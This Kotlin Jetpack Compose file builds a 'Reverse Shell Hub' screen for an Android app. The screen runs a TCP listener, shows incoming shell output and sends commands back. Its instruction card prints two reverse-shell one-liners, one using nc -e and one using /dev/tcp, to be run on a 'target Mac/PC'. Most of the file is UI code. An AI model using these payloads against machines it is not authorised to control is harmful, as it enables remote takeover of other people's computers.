package com.example.rabit.ui.automation

import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalSoftwareKeyboardController
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.rabit.ui.MainViewModel
import com.example.rabit.ui.theme.*

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ReverseShellScreen(
    viewModel: MainViewModel,
    onBack: () -> Unit
) {
    val lines by viewModel.reverseShellLines.collectAsState()
    val status by viewModel.reverseShellStatus.collectAsState()
    val isConnected by viewModel.reverseShellConnected.collectAsState()
    val isListening by viewModel.isReverseShellListening.collectAsState()
    
    var commandInput by remember { mutableStateOf("") }
    var portInput by remember { mutableStateOf("4444") }
    val keyboardController = LocalSoftwareKeyboardController.current
    val listState = rememberLazyListState()

    // Auto-scroll to bottom when new lines arrive
    LaunchedEffect(lines.size) {
        if (lines.isNotEmpty()) {
            listState.animateScrollToItem(lines.size - 1)
        }
    }

    Scaffold(
        containerColor = Obsidian,
        topBar = {
            CenterAlignedTopAppBar(
                title = {
                    Text(
                        "REVERSE SHELL HUB",
                        style = MaterialTheme.typography.titleMedium.copy(
                            fontWeight = FontWeight.ExtraBold,
                            letterSpacing = 2.sp,
                            color = Platinum
                        )
                    )
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, "Back", tint = Platinum)
                    }
                },
                colors = TopAppBarDefaults.centerAlignedTopAppBarColors(
                    containerColor = Color.Transparent
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 20.dp)
        ) {
            Spacer(modifier = Modifier.height(10.dp))

            // Connection Status & Header
            Surface(
                color = if (isConnected) SuccessGreen.copy(alpha = 0.1f) else Color.Black.copy(alpha = 0.3f),
                shape = RoundedCornerShape(16.dp),
                border = androidx.compose.foundation.BorderStroke(1.dp, Platinum.copy(alpha = 0.05f))
            ) {
                Row(
                    modifier = Modifier.padding(16.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Box(
                        modifier = Modifier
                            .size(10.dp)
                            .background(
                                when {
                                    isConnected -> SuccessGreen
                                    isListening -> Color.Yellow
                                    else -> Color.Red
                                }, 
                                RoundedCornerShape(3.dp)
                            )
                    )
                    Spacer(modifier = Modifier.width(12.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            status,
                            color = Platinum,
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            if (isConnected) "Session active" else if (isListening) "Awaiting payload..." else "Listener stopped",
                            color = Silver.copy(alpha = 0.5f),
                            fontSize = 11.sp
                        )
                    }

                    if (!isConnected) {
                        OutlinedTextField(
                            value = portInput,
                            onValueChange = { portInput = it },
                            label = { Text("Port") },
                            modifier = Modifier.width(80.dp),
                            singleLine = true,
                            enabled = !isListening,
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedTextColor = Platinum,
                                unfocusedTextColor = Platinum,
                                focusedBorderColor = AccentTeal
                            )
                        )
                        Spacer(modifier = Modifier.width(12.dp))
                        IconButton(
                            onClick = {
                                if (isListening) viewModel.stopReverseShellListener()
                                else viewModel.startReverseShellListener(portInput.toIntOrNull() ?: 4444)
                            },
                            modifier = Modifier.background(AccentTeal.copy(alpha = 0.1f), RoundedCornerShape(12.dp))
                        ) {
                            Icon(
                                if (isListening) Icons.Default.Stop else Icons.Default.PlayArrow,
                                null,
                                tint = AccentTeal
                            )
                        }
                    } else {
                        IconButton(
                            onClick = { viewModel.stopReverseShellListener() },
                            modifier = Modifier.background(Color.Red.copy(alpha = 0.1f), RoundedCornerShape(12.dp))
                        ) {
                            Icon(Icons.Default.LinkOff, null, tint = Color.Red)
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(20.dp))

            // Instructions / Terminal
            if (!isConnected && !isListening) {
                TerminalInstructionCard(portInput)
            } else {
                Surface(
                    modifier = Modifier.weight(1f).fillMaxWidth(),
                    color = Color.Black.copy(alpha = 0.5f),
                    shape = RoundedCornerShape(16.dp),
                    border = androidx.compose.foundation.BorderStroke(1.dp, Color.White.copy(alpha = 0.05f))
                ) {
                    LazyColumn(
                        state = listState,
                        modifier = Modifier.fillMaxSize().padding(12.dp),
                        verticalArrangement = Arrangement.Bottom
                    ) {
                        items(lines) { line ->
                            Text(
                                line,
                                color = if (line.startsWith(">")) AccentTeal else SuccessGreen.copy(alpha = 0.8f),
                                fontFamily = FontFamily.Monospace,
                                fontSize = 12.sp,
                                modifier = Modifier.padding(vertical = 1.dp)
                            )
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            // Input Row
            Row(
                modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                OutlinedTextField(
                    value = commandInput,
                    onValueChange = { commandInput = it },
                    placeholder = { Text("Enter command...", color = Silver.copy(alpha = 0.3f)) },
                    modifier = Modifier.weight(1f),
                    enabled = isConnected,
                    shape = RoundedCornerShape(12.dp),
                    singleLine = true,
                    keyboardOptions = KeyboardOptions(imeAction = ImeAction.Send),
                    keyboardActions = KeyboardActions(onSend = {
                        if (commandInput.isNotBlank()) {
                            viewModel.sendReverseShellCommand(commandInput)
                            commandInput = ""
                        }
                    }),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Platinum,
                        unfocusedTextColor = Platinum,
                        focusedBorderColor = AccentTeal,
                        unfocusedBorderColor = Color.White.copy(alpha = 0.1f)
                    )
                )
                Spacer(modifier = Modifier.width(12.dp))
                IconButton(
                    onClick = {
                        if (commandInput.isNotBlank()) {
                            viewModel.sendReverseShellCommand(commandInput)
                            commandInput = ""
                        }
                    },
                    enabled = isConnected,
                    modifier = Modifier
                        .size(52.dp)
                        .background(
                            if (isConnected) AccentTeal.copy(alpha = 0.2f) else Platinum.copy(alpha = 0.05f),
                            RoundedCornerShape(12.dp)
                        )
                ) {
                    Icon(Icons.Default.Send, null, tint = if (isConnected) AccentTeal else Silver.copy(alpha = 0.3f))
                }
            }
        }
    }
}

@Composable
private fun TerminalInstructionCard(port: String) {
    Card(
        colors = CardDefaults.cardColors(containerColor = Graphite.copy(alpha = 0.4f)),
        shape = RoundedCornerShape(20.dp),
        border = androidx.compose.foundation.BorderStroke(1.dp, Color.White.copy(alpha = 0.05f))
    ) {
        Column(modifier = Modifier.padding(20.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Info, null, tint = AccentTeal, modifier = Modifier.size(18.dp))
                Spacer(modifier = Modifier.width(8.dp))
                Text("How to catch a shell", color = Platinum, fontWeight = FontWeight.Bold)
            }
            Text(
                "1. Start listener: Tap the Play button above.\n" +
                "2. Connectivity: Ensure both devices are on the same Wi-Fi.\n" +
                "3. Execute: Run a payload below on the target Mac/PC.\n" +
                "4. Control: The phone will instantly show the shell once linked.",
                color = Silver.copy(alpha = 0.7f),
                fontSize = 12.sp,
                lineHeight = 18.sp
            )
            
            PayloadBox("nc -e /bin/zsh [IP] $port")
            PayloadBox("zsh -i >& /dev/tcp/[IP]/$port 0>&1")
            
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(AccentTeal.copy(alpha = 0.05f), RoundedCornerShape(12.dp))
                    .padding(12.dp)
            ) {
                Text(
                    "PRO TIP: Replace [IP] with your phone's Wi-Fi IP. This is a raw TCP listener; no encryption is applied by default.",
                    color = AccentTeal,
                    fontSize = 10.sp,
                    fontWeight = FontWeight.Bold,
                    lineHeight = 14.sp
                )
            }
        }
    }
}

@Composable
private fun PayloadBox(command: String) {
    Surface(
        color = Color.Black.copy(alpha = 0.5f),
        shape = RoundedCornerShape(8.dp),
        modifier = Modifier.fillMaxWidth()
    ) {
        Text(
            command,
            color = SuccessGreen,
            fontFamily = FontFamily.Monospace,
            fontSize = 11.sp,
            modifier = Modifier.padding(12.dp)
        )
    }
}
